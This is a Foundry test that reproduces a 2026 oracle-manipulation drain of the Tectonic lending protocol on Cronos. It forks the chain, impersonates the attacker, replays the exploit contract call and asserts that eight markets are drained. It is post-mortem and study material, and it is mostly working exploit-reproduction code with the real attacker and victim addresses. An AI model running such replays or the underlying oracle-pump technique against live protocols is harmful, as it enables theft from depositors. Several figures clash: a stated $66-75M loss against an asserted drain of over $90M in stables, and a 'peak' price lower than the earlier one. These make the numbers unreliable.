// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Tectonic (@TectonicFi, Compound-v2 fork) — Cronos EVM (chainId 25, NOT the Cosmos-SDK layer)
// Cronos's largest lending market. Every liquid Tectonic market was drained in a single tx after
// the protocol's own governance token TONIC (accepted as collateral) was pumped ~100-200x and
// borrowed against. Reported loss ~$66-75M; the Cronos EVM chain halted block production in
// response at block 90907150 (2026-08-30T14:32:47Z), ~1h43m after this tx.
//
// Primary (self-contained) exploit tx : 0xddc9dc47d330116332ae687ba939f6d6196c4cc5950b2cdb04ae826520eeca20
//                                       block 90897110, 2026-08-30T12:49:39Z
// Attacker EOA (tx.origin/from)        : 0x4266a0E6A0f0ef90AbCFF3BB089932cA0CCe3652 (nonce 38)
// Exploit contract (to)                : 0xd3aaC8a1a9e412E2C590463a8B6F90125e23f1F3
//                                       selector 0x26faf313, no args — orchestrates the whole drain
// Borrower / market-facing contract    : 0x2dc6A36F4e5eeEFE112C01569de96dEa496Bb618
//                                       calls tToken.borrow() (Compound msg.sender), then forwards
//                                       the proceeds to the attacker's parking addresses below.
//
// Fund destinations (verified from the tx's Transfer logs):
//   0x7d4e7e5DCb0ccc66b4f0f8B0f30da5078Ad4F2dc  ~$75.67M stables (USDC 41.43M + USDT 34.24M)
//   0x085f3115CA368Aa262246d22f9476E1E2c87e8bE  the mixed basket (USDC/USDT/WBTC/WETH/CDCBTC/
//                                                CDCETH/XRP/LCRO + WCRO)
//
// Victim protocol contracts (all confirmed on-chain, Cronos EVM):
//   Comptroller (Tectonic Core) : 0xb3831584acb95ED9cCb0C11f677B5AD01DeaeEc0
//   Price oracle                : 0xD360D8cABc1b2e56eCf348BFF00D2Bd9F658754A
//   TONIC token                 : 0xDD73dEa10ABC2Bff99c60882EC5b2B81Bb1Dc5B2 (18 dec, 500T supply)
//   tTONIC collateral market    : 0xfe6934FDf050854749945921fAA83191Bccf20Ad (20% collateral factor)
//
// Root cause (verified against on-chain state and the tx trace, NOT a key/signer/privileged path):
//   Tectonic accepts its own thin-liquidity governance token TONIC as collateral and prices it
//   through the comptroller oracle above, which tracks TONIC's on-chain (DEX) market price. The
//   attacker pumped TONIC ~100-200x by buying against the thin pool, so the oracle reported a
//   grossly inflated collateral value. Measured directly on-chain via
//   oracle.getUnderlyingPrice(tTONIC) (scaled 1e(36-18) = price * 1e18):
//     - baseline (block 90896000, pre-pump)  : 10_622_000_000        (~$1.06e-8 / TONIC)
//     - fork block 90897109 (this tx's pre)  : 2_076_321_000_000     (~196x baseline)
//     - intraday peak (block ~90897500)      : 1_215_837_000_000     already ~114x
//   The attacker had ~342 trillion TONIC supplied as tTONIC collateral. At the inflated price the
//   comptroller reported getAccountLiquidity(borrower) = 136_835_847_149_861_835_932_153_050
//   (~$136.8M of borrow capacity, shortfall 0) at the fork block. Against that standing capacity
//   the permissionless Compound borrow() was called across every liquid market, walking out with
//   the real underlying and leaving bad debt once the price normalised.
//
//   borrow() is public and permissionless; the only "authorization" is the oracle price the
//   comptroller trusts. This is the same class as MoonwellMAMO_exp.sol (thin governance/protocol
//   token as collateral, no manipulation-resistant pricing) in this same folder.
//
// Not one atomic function from scratch: the TONIC pump and the tTONIC collateral supply happened
// in earlier transactions (there were smaller ramp-up borrows by the same borrower at blocks
// 90896190 / 90896384 / 90896735). So at the fork block (exploit block - 1) the inflated price and
// the collateral are already present in state. This tx is the large, self-contained drain against
// that standing position.
//
// Faithful reproduction: fork Cronos EVM at block 90897109 (real protocol state, inflated price and
// collateral already present) and replay the exact tx — call the attacker's exploit contract with
// its verbatim 4-byte calldata (0x26faf313), pranking the attacker EOA as BOTH msg.sender and
// tx.origin. Assert that every liquid Tectonic market's underlying cash is drained to dust.
//
// TONIC market bytecode uses Cancun-era opcodes (Cronos EVM is post-Cancun), so cancun is required:
//   forge test --contracts ./src/test/2026-08/TectonicTONIC_exp.sol --evm-version cancun -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

interface IOracle {
    function getUnderlyingPrice(address tToken) external view returns (uint256);
}

interface IComptroller {
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

contract TectonicTONIC_exp is Test {
    // attacker
    address internal constant ATTACKER_EOA = 0x4266a0E6A0f0ef90AbCFF3BB089932cA0CCe3652;
    address internal constant EXPLOIT_CONTRACT = 0xd3aaC8a1a9e412E2C590463a8B6F90125e23f1F3;
    address internal constant BORROWER = 0x2dc6A36F4e5eeEFE112C01569de96dEa496Bb618;

    // Tectonic
    IComptroller internal constant COMPTROLLER = IComptroller(0xb3831584acb95ED9cCb0C11f677B5AD01DeaeEc0);
    IOracle internal constant ORACLE = IOracle(0xD360D8cABc1b2e56eCf348BFF00D2Bd9F658754A);
    address internal constant tTONIC = 0xfe6934FDf050854749945921fAA83191Bccf20Ad;

    // drained markets and their underlyings (tToken market => underlying token)
    address[8] internal markets = [
        0xB3bbf1bE947b245Aef26e3B6a9D777d7703F4c8e, // tUSDC
        0xA683fdfD9286eeDfeA81CF6dA14703DA683c44E5, // tUSDT
        0x67fD498E94d95972a4A2a44AccE00a000AF7Fe00, // tWBTC
        0xecD4bea6ed20a4a820ae2C4900E5501a985A3fe3, // tCDCBTC
        0x543F4Db9BD26C9Eb6aD4DD1C33522c966C625774, // tWETH
        0xBffcD14ED8cB224B26B692d7Eb4118FFEDFAbDbd, // tCDCETH
        0x53B4112cba389302B065d2A92bB249d27f51c680, // tXRP
        0xf4F21A4990ACD891d05dface12A2b8F57e61d1Ee // tLCRO
    ];
    IERC20[8] internal underlyings = [
        IERC20(0xc21223249CA28397B4B6541dfFaEcC539BfF0c59), // USDC (6)
        IERC20(0x66e428c3f67a68878562e79A0234c1F83c208770), // USDT (6)
        IERC20(0x062E66477Faf219F25D27dCED647BF57C3107d52), // WBTC (8)
        IERC20(0x2e53c5586e12a99d4CAE366E9Fc5C14fE9c6495d), // CDCBTC (8)
        IERC20(0xe44Fd7fCb2b1581822D0c862B68222998a0c299a), // WETH (18)
        IERC20(0x7a7c9db510aB29A2FC362a4c34260BEcB5cE3446), // CDCETH (18)
        IERC20(0xb9Ce0dd29C91E02d4620F57a66700Fc5e41d6D15), // XRP (6)
        IERC20(0x9Fae23A2700FEeCd5b93e43fDBc03c76AA7C08A6) // LCRO (18)
    ];

    function setUp() public {
        // fork at exploit block - 1: inflated TONIC price and tTONIC collateral already in state
        vm.createSelectFork("cronos", 90_897_109);
    }

    function testExploit() public {
        // --- show the manipulated oracle state the comptroller trusted ---
        uint256 tonicPx = ORACLE.getUnderlyingPrice(tTONIC);
        emit log_named_decimal_uint("TONIC oracle price (getUnderlyingPrice, 1e18)", tonicPx, 18);
        emit log_string("  baseline pre-pump (block 90896000) was 10_622_000_000 -> ~196x inflated here");

        (, uint256 liquidity,) = COMPTROLLER.getAccountLiquidity(BORROWER);
        emit log_named_decimal_uint("Attacker getAccountLiquidity (USD, 1e18)", liquidity, 18);

        // --- record protocol cash before ---
        uint256[8] memory pre;
        for (uint256 i; i < 8; i++) {
            pre[i] = underlyings[i].balanceOf(markets[i]);
        }
        emit log_string("--- Tectonic market cash BEFORE ---");
        _logCash(pre);

        // --- replay the exact on-chain exploit tx: EOA -> exploit contract, verbatim calldata ---
        vm.prank(ATTACKER_EOA, ATTACKER_EOA); // msg.sender AND tx.origin = attacker EOA
        (bool ok,) = EXPLOIT_CONTRACT.call(hex"26faf313");
        require(ok, "exploit call reverted");

        // --- record protocol cash after ---
        uint256[8] memory post;
        for (uint256 i; i < 8; i++) {
            post[i] = underlyings[i].balanceOf(markets[i]);
        }
        emit log_string("--- Tectonic market cash AFTER (drained to dust) ---");
        _logCash(post);

        // --- every liquid market drained by >99% ---
        for (uint256 i; i < 8; i++) {
            assertGt(pre[i], 0, "market had no cash to drain");
            assertLt(post[i] * 100, pre[i], "market not drained by >99%");
        }

        // headline: stables alone
        uint256 usdcOut = pre[0] - post[0];
        uint256 usdtOut = pre[1] - post[1];
        emit log_named_decimal_uint("USDC drained", usdcOut, 6);
        emit log_named_decimal_uint("USDT drained", usdtOut, 6);
        emit log_named_decimal_uint("WETH drained", pre[4] - post[4], 18);
        assertGt(usdcOut + usdtOut, 90_000_000e6, "expected >$90M stables drained");
    }

    function _logCash(uint256[8] memory bals) internal {
        for (uint256 i; i < 8; i++) {
            emit log_named_decimal_uint(underlyings[i].symbol(), bals[i], underlyings[i].decimals());
        }
    }
}
